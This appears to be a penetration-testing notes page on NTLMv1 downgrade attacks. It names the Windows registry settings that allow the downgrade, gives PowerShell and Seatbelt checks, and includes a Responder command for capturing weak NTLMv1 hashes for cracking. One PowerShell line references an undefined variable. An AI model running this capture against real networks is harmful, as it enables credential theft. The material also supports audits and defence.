# NTLMv1 Downgrade

* [https://github.com/NotMedic/NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)
* [https://crack.sh/netntlm/](https://crack.sh/netntlm/)
* [https://crack.sh/cracking-ntlmv1-w-ess-ssp/](https://crack.sh/cracking-ntlmv1-w-ess-ssp/)
* [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)
* [https://0xdf.gitlab.io/2021/04/10/htb-apt.html#seatbelt](https://0xdf.gitlab.io/2021/04/10/htb-apt.html#seatbelt)

Client sends NTLMv1 response when `LmCompatibilityLevel` exists and is `2` or lower, which can be downgraded to "NTLMv1 w/o SSP" when `NtlmMinClientSec` is `0x20` or lower:

| Property Name                                                                                                                                                          | Property Path                                      |
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------|
| [LmCompatibilityLevel](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level) | `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`        |
| [NtlmMinClientSec](http://systemmanager.ru/win2k_regestry.en/85673.htm)                                                                                                | `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0` |

Check with PowerShell:

```
PS > (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name LmCompatibilityLevel).LmCompatibilityLevel
2
PS > $decValue = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ -Name NtlmMinClientSec).NtlmMinClientSec
PS > $hexValue = "0x" + [string]::Format("{0:x}", $value)
PS > $hexValue
0x20
```

Check with [Seatbelt](https://github.com/GhostPack/Seatbelt/blob/fa0f2d94a049d825bef77e103e33167250ed2ac0/Seatbelt/Commands/Windows/NtlmSettingsCommand.cs#L149):

```
Cmd > .\Seatbelt.exe NTLMSettings
```

Exploit with Responder (see [Coerce Authentication](/pentest/infrastructure/ad/authentication-coercion.md) to trigger callbacks):

```
$ sudo python Responder.py -I eth0 -v --lm --disable-ess
```
